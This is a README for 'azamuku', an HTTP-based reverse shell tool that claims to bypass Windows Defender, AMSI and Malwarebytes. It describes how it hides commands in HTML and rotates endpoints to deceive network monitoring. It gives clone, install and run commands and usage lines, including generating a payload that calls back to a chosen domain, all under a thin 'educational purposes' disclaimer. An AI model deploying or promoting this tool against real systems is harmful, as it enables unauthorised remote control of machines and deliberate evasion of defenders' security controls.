# azamuku - mutli-client, HTTP based reverse shell
### azamuku (aza·muku) - to deceive, to delude, to trick, to fool
***
![Alt text](image-2.png)
***
azamuku is a reverse shell inspired by [t3l3machus' hoaxshell](https://github.com/t3l3machus/hoaxshell) that bypasses windows defender, AMSI, and even malwarebytes (as of 11/11/23).

it's not tested as of yet, but its also expected to bypass firewalls that are meant to block hoaxshell's beaconing and post requests, even if that same firewall manually inspected each HTTP(S) packet - due to the command being hidden in html, and the response being encoded

its also meant to **trick** (hence the name) sysadmins that are inspecting LAN/WAN traffic, since it just looks normal, due to the alternating endpoints and html wrapped commands

## **DISCLAIMERS**
- ***please don't use this in real world attacks. this was made for educational purposes and i'd like to keep it that way. i'm also not responsible of what you do with this tool - you are responsible of your own actions***
- this isn't meant to be "best reverse shell ever!!!" this was just a little project to teach me more about AMSI, powershell, and windows defender, that turned out to be an actual pretty cool tool
- this isn't foolproof
- https doesn't really work, but its not expected of you to use it anyways
- i created everything, there was just inspo from hoaxshell

## setup
```
git clone https://github.com/whatotter/azamuku && cd azamuku
pip install -r requirements.txt
chmod +x azamuku
./azamuku
```

## how does it work?

here's a really cool flowchart on how it works (somewhat):

![](image-1.png)

the html response when it checks the command pool is an html file from `./core/masks/html`, with a replaced tag - these are called **masks**.  
if you want to learn more about these masks, view `MASKS.md`

once it recieves and parses the command from the mask, it'll run the command, and POST it to a random endpoint from `./core/masks/endpoints.txt`, which the server will automatically receive and save

it still uses http GET requests to beacon (which sucks, but it works), and uses http POST requests to send data

## usage
### using https (NOT RECCOMENDED)
if these pem files don't exist, azamuku asks you if you'd like to make them using openssl  
```./azamuku --certfile cert.pem --keyfile key.pem```

### stager/autorun commands
it's not really a ps1 script, but more of a list of commands  
```./azamuku --stager script.ps1```

### with domain name
you don't need to do anything special here, just when you generate the payload, set it as your domain instead of your ip  
```./azamuku -s 0.0.0.0 --http-port 80```  
```[azamuku]> payload example.com 80```

basically self explanatory

## limits
same as hoaxshell's limits - no interactive commands/shells

## contributing
i'm pretty sure nobody is gonna contribute, but if you do, just don't mess up working features and make the code readable - other than that, go ham :)

## update logs
none :(